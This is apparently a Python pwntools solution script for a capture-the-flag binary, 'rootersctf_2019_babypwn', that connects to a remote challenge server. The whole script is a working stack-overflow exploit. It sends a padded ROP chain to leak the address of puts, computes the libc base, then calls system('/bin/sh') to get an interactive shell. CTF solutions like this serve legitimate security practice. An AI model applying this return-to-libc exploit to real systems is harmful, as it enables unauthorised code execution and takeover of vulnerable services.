# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './rootersctf_2019_babypwn'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29967'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)

main_addr = elf.sym["main"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x0000000000401223
ret = 0x000000000040101a

payload = "a"*0x108  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

sla("back>",payload)

puts_addr = l64()


libc.address = puts_addr - libc.sym["puts"]
system = libc.sym["system"]
bin_sh = libc.search("/bin/sh").next()

lg("puts_addr",puts_addr)
lg("libc.address",libc.address)
lg("system",system)
lg("bin_sh",bin_sh)

payload = "a"*0x108 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
sla("back>",payload)

p.interactive()

'''
@File    :   rootersctf_2019_babypwn.py
@Time    :   2021/07/18 00:18:52
@Author  :   Niyah 
'''